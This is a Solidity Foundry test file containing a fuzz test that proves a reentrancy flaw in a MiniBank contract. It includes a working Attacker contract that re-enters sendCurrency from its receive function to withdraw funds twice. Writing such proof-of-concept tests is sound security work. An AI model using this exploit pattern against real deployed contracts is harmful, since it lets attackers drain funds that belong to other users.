
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {MiniBank} from "../src/MiniBank.sol";

contract TestReentrancyMiniBank is Test {
    MiniBank public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new MiniBank();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // Constrain fuzz value to reasonable ETH amounts to avoid overflows or unrealistic scenarios
        vm.assume(attackVal > 0.1 ether && attackVal < 100 ether);

        // Fund the victim contract so it has enough ETH to be stolen (more than the deposit)
        vm.deal(address(_contractUnderTest), attackVal * 10);
        
        // Fund the test contract to send the initial deposit to the attacker
        vm.deal(address(this), attackVal * 2);

        // Perform the attack
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // Verify that the attacker was able to re-enter and increment the call count
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    MiniBank public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;

    constructor(address victimAddress) { 
        _victim = MiniBank(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        
        // Deposit funds to pass the balance check in sendCurrency
        _victim.receiveCurrency{value: val}();
    }

    function attack(uint256 val) public {
        // Initiate the withdrawal which triggers the vulnerability
        _victim.sendCurrency();

        // If we successfully re-entered, the count will be > 1
        if (attackCallCount > 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        attackCallCount++;
        
        // Re-enter the victim contract before the state is updated
        if (attackCallCount < 2) {            
            _victim.sendCurrency();
        }
    }
}
